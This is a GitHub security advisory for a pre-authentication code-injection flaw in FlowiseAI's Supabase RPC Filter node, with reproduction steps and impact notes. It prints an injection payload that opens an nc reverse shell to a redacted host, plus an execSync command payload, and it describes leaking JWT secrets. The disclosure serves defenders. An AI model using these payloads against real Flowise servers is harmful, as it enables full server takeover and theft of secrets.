# [C] FlowiseAI Pre-Auth Arbitrary Code Execution

## Summary
Severity: Critical
Advisory: GHSA-7944-7c6r-55vv
CVE: CVE-2025-57164
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-09-15
Source: https://github.com/advisories/GHSA-7944-7c6r-55vv
Type: github-advisory

## Affected
- npm: `flowise` — affected >=3.0.5 <3.0.6

## Details
## Summary

An authenticated admin user of **FlowiseAI** can exploit the **Supabase RPC Filter** component to execute **arbitrary server-side code** without restriction. By injecting a malicious payload into the filter expression field, the attacker can directly trigger JavaScript's `execSync()` to launch reverse shells, access environment secrets, or perform any OS-level command execution.

This results in **full server compromise** and severe breach of trust boundaries between frontend input and backend execution logic.

## Details

FlowiseAI includes a component called `Supabase.ts`, located at: `packages/components/nodes/vectorstores/Supabase/Supabase.ts#L237`

<img width="622" height="177" alt="image(3)" src="https://github.com/user-attachments/assets/f30ccd12-4709-44ac-a6ef-8f57a1cb5c3b" />

This creates a function from user-provided string `supabaseRPCFilter` with no filtering, escaping, or sandboxing in place. Any injected JavaScript in this string is compiled and executed **immediately** when the node is triggered.

### Exploit

We configured our environment to use Supabase entities as follows:

<img width="573" height="765" alt="image(4)" src="https://github.com/user-attachments/assets/b8c721db-7b6b-4fb4-99c1-a4b0c3f98caf" />

To confirm the vulnerability, a filter expression was crafted to forcibly raise an error and expose sensitive environment variables:

<img width="1920" height="915" alt="image(5)" src="https://github.com/user-attachments/assets/19e377dd-fd78-4437-b2d4-48c72d75f947" />

![image-1](https://github.com/user-attachments/assets/34e71d47-6ecb-4a93-af0f-3526696f16e6)
![image-2](https://github.com/user-attachments/assets/a512537c-caa9-4f70-a7be-1e75a622c06e)

This results in the **JWT secret being printed** to the frontend, confirming access to server-side environment variables.

Subsequently, a **reverse shell** was successfully established using:

`filter(process.mainModule.require("child_process").execSync("nc [REDACTED] 9999 -e /bin/sh"), "gt", 5)`

<img width="425" height="475" alt="image(6)" src="https://github.com/user-attachments/assets/6dde2461-8db4-4d8d-8318-7b7171a32eb4" />

This proves arbitrary OS-level command execution is possible **within the FlowiseAI backend runtime context**.

## Steps to Reproduce

1. Deploy a FlowiseAI instance with the Supabase vector store enabled.
2. Login as an admin user.
3. Drag in a `Supabase` node and configure "Supabase RPC Filter".
4. Insert a malicious payload in the filter expression, such as:
    
    `process.mainModule.require("child_process").execSync("id")`
    
5. Trigger the chatbot or workflow to activate the node.
6. Observe execution of arbitrary code on the backend.

## Impact

- **Remote Code Execution** (RCE): Full OS-level code execution from frontend user input.
- **Environment Leakage**: Access to sensitive env variables like `JWT_REFRESH_TOKEN_SECRET`.
- **Reverse Shells**: Ability to connect out of the server and gain interactive remote shell access.
- **Persistence Risk**: Attacker can install malware, establish persistence, or exfiltrate data.
- **LLM Prompt Tampering**: Malicious outputs may be injected back into LLM chains.

## Trust Boundary Violation

The vulnerability breaks the boundary between frontend node configuration and backend execution logic. An attacker-supplied value (`supabaseRPCFilter`) becomes part of **compiled JavaScript logic**, blending user-controlled input with trusted backend execution.

This violates **OWASP LLM Top 10 - LLM-06: Sensitive Code Execution**, especially in low-code / visual LLM agents.

## Evidence

*Environment variable leakage via malformed JSON*

*Reverse shell successfully triggered using attacker-controlled input*

## Credit

**This report was prepared by Team 404 Not Found 퇴근 (WhiteHat School 3rd cohort, South Korea)**

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7944-7c6r-55vv
- https://nvd.nist.gov/vuln/detail/CVE-2025-57164
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/blob/flowise%403.0.5/packages/components/nodes/vectorstores/Supabase/Supabase.ts#L237
- https://github.com/FlowiseAI/Flowise/blob/main/packages/components/nodes/vectorstores/Supabase/Supabase.ts#L237
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.6
